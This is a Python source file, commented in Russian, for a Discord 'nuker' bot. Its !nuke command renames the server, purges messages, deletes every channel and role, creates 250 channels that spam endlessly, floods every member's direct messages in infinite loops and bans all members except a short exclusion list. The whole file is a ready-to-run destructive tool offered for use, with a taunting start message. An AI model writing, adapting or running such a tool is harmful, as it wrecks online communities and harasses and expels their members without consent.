data = {
    # Токен бота
    'BOT_TOKEN': 'TOKEN',

    # Имя для каналов крашера
    'CRASHER_CHANNELS_NAME': 'Спам',

    # Текст для спама
    'SPAM_TEXT': 'Текст для спама',

    # Причина для бана
    'BAN_REASON': 'Причина бана',

    # Новое имя для сервера
    'RENAME_SERVER_TO': 'Новое имя для сервера',

    # Новое имя для ролей
    'ROLES_NAME': 'Создание роли (имя роли)',

    # Спам участникам в ЛС
    'DM_SPAM': 'Спам текста в лс',

    # Сообщение при запуске крашера
    'CRASHER_START_MESSAGE': 'THIS SERVER CRASHES BY ILOVERUSSIA NUKER🤡!!!',

    'NUKER_OPTIONS': {
        # Нужно ли переименовывать сервер?
        'RENAME_GUILD': True,

        # Нужно ли очистить сообщения?
        'PURGE': True,

        # Нужно ли спамить участникам в ЛС?
        'FLOOD_DM': True,

        # Удалить все каналы, и создать новые со спамом?
        'CREATE_AND_SPAM_CHANNELS': True,

        # Пересоздать ли роли?
        'CDROLES': True,

        # Банить ли участников?
        'BAN_MEMBERS': True
    },

    # Участники, которых не нужно банить.

    'BAN_EXCLUDES':
        [
            'test-member#0001',
            'test-member#0002'
        ]
}

from os import name, system

clear = lambda: system('cls' if name == 'nt' else 'clear')

from colorama import Fore

print(Fore.YELLOW + 'КРАШ БОТ')

import asyncio

asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

from discord.ext import commands

client = commands.Bot(command_prefix='!')

async def CREATE_ROLE(ctx):
    try:
        await ctx.guild.create_role(name=data['ROLES_NAME'])
        print(Fore.RED + f'СОЗДАНА РОЛЬ!')
    except:
        pass


async def DELETE_OBJECT(OBJECT):
    try:
        await OBJECT.delete()
        print(f'УДАЛЕНО: {OBJECT}')
    except:
        print(f'НЕ УДАЛОСЬ УДАЛИТЬ: {OBJECT}')


async def BAN(MEMBER):
    try:
        await MEMBER.ban(reason=data['BAN_REASON'])
        print(f'ЗАБАНЕН: {MEMBER}')
    except:
        print(f'НЕ УДАЛОСЬ ЗАБАНИТЬ: {MEMBER}')


@client.command()
async def deleteroles(ctx):
    try:
        for role in ctx.guild.roles:
            asyncio.create_task(DELETE_OBJECT(role))
    except:
        pass


@client.command()
async def createroles(ctx):
    try:
        for x in range(250):
            asyncio.create_task(CREATE_ROLE(ctx))
        print(Fore.GREEN + 'СОЗДАНО 250 ЗАДАЧ ПО СОЗДАНИЮ РОЛЕЙ')
    except:
        pass


async def NEW_CHANNEL(ctx):
    try:
        c = await ctx.guild.create_text_channel(data['CRASHER_CHANNELS_NAME'])
        while True:
            await c.send(data['SPAM_TEXT'])
    except:
        pass


@client.command()
async def cdchannels(ctx):
    try:
        for CHANNEL in ctx.guild.channels:
            asyncio.create_task(DELETE_OBJECT(CHANNEL))
            print(Fore.RED + f'УДАЛЁН КАНАЛ!')
        for x in range(250):
            asyncio.create_task(NEW_CHANNEL(ctx))
            print(Fore.YELLOW + f'СОЗДАН НОВЫЙ КАНАЛ!')
        print(Fore.RED + f'СОЗДАНО 250 ЗАДАЧ ПО СОЗДАНИЮ КАНАЛОВ!')
    except:
        raise


@client.command()
async def memberban(ctx):
    for member in ctx.guild.members:

        if (member.username+"#"+str(member.discriminator)) not in data['BAN_EXCLUDES']:

            asyncio.create_task(BAN(member))


@client.command()
async def renameguild(ctx):
    print(Fore.GREEN + 'СЕРВЕР ПЕРЕИМЕОВАН')
    await ctx.guild.edit(name=data['RENAME_SERVER_TO'])


async def DM_USER(ctx, member):
    try:
        while True:
            await member.send(data['DM_SPAM'])
    except:
        print(Fore.RED + 'WARNING: НЕ УДАЛОСЬ ЗАПУСТИТЬ ФЛУД ЛС!')


@client.command()
async def flooddm(ctx):
    for member in ctx.guild.members:
        asyncio.create_task(DM_USER(ctx, member))


@client.command()
async def purge(ctx):
    await ctx.channel.purge(limit=None)


@client.command()
async def nuke(ctx):
    await ctx.send(data['CRASHER_START_MESSAGE'])

    await asyncio.sleep(3)

    if data['NUKER_OPTIONS']['RENAME_GUILD']:
        asyncio.create_task( renameguild(ctx) )

    if data['NUKER_OPTIONS']['PURGE']:
        asyncio.create_task( purge(ctx) )

    if data['NUKER_OPTIONS']['FLOOD_DM']:
        asyncio.create_task( flooddm(ctx) )

    if data['NUKER_OPTIONS']['CREATE_AND_SPAM_CHANNELS']:
        asyncio.create_task( cdchannels(ctx) )

    if data['NUKER_OPTIONS']['CDROLES']:
        asyncio.create_task( deleteroles(ctx) )
        asyncio.create_task( createroles(ctx) )

    if data['NUKER_OPTIONS']['BAN_MEMBERS']:
        asyncio.create_task( memberban(ctx) )


clear()
print('БОТ ГОТОВ!\n\n!nuke - запуск')

try:
    client.run(data['BOT_TOKEN'])
except:
    print(Fore.RED + 'УКАЗАН НЕВЕРНЫЙ ТОКЕН!' + Fore.WHITE)
